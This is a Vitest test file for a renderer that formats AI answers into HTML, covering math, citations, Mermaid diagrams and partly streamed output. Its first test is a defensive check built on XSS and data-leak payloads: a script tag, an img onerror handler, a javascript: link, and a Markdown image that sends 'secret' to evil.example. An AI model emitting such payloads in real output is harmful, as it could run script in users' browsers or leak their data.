import { describe, it, expect } from "vitest";
import katex from "katex";
import { renderAnswer, hasMath, hasMermaid } from "../src/ai/render";

describe("rendering answers", () => {
  it("shows raw HTML as text and never loads images or script links", () => {
    const h = renderAnswer('Hi <script>alert(1)</script> <img src=x onerror=alert(1)> ![a](https://evil.example/?d=secret) [x](javascript:alert(1)) [ok](https://example.org)');
    expect(h).not.toMatch(/<script|<img|evil\.example|href="javascript/i);
    expect([...h.matchAll(/<(\w+)/g)].map(m => m[1])).toEqual(["p", "a"]); // the only elements
    expect(h).toContain("&lt;script&gt;");
    expect(h).toContain('<a href="https://example.org" target="_blank" rel="noopener noreferrer nofollow">ok</a>');
  });
  it("renders math with KaTeX, inline and display, and leaves prices alone", () => {
    const t = "Energy $E=mc^2$ and $$\\int_0^1 x\\,dx$$ also \\(a+b\\) and \\[\\frac12\\]. It costs $5 and $10.";
    expect(hasMath(t)).toBe(true);
    const h = renderAnswer(t, { katex });
    expect((h.match(/class="katex"/g) || []).length).toBe(4);
    expect((h.match(/katex-display/g) || []).length).toBe(2);
    expect(h).toContain("It costs $5 and $10.");
    expect(hasMath("It costs $5 and $10.")).toBe(false);
  });
  it("without KaTeX loaded, math shows as its source", () => {
    expect(renderAnswer("so $x^2$", {})).toContain('<code class="tex">x^2</code>');
  });
  it("keeps code exactly as written: no math and no citations inside it", () => {
    const h = renderAnswer("`$x$ [1.2]`\n\n```\nlet a = $b$; // [1.2]\n```", { katex, sent: new Set(["1.2"]) });
    expect(h).not.toContain("katex"); expect(h).not.toContain("cite");
    expect(h).toContain("$x$ [1.2]"); expect(h).toContain("let a = $b$; // [1.2]");
  });
  it("turns only citations of passages that were sent into buttons", () => {
    const h = renderAnswer("As said [3.10, 9.9] and [4.0].", { sent: new Set(["3.10", "4.0"]), label: id => "p" + id });
    expect(h).toContain('<button type="button" class="cite" data-cite="3.10">p3.10</button>');
    expect(h).toContain('data-cite="4.0"'); expect(h).not.toContain("9.9");
  });
  it("marks Mermaid blocks for drawing and escapes their source", () => {
    const t = "```mermaid\ngraph TD; A-->B<script>\n```";
    expect(hasMermaid(t)).toBe(true);
    const h = renderAnswer(t);
    expect(h).toContain('<div class="mermaid-src">'); expect(h).toContain("A--&gt;B&lt;script&gt;");
  });
  it("a half-streamed answer still renders", () => {
    expect(() => renderAnswer("Partial $\\frac{1}{")).not.toThrow();
    expect(() => renderAnswer("```mermaid\ngraph TD")).not.toThrow();
  });
});
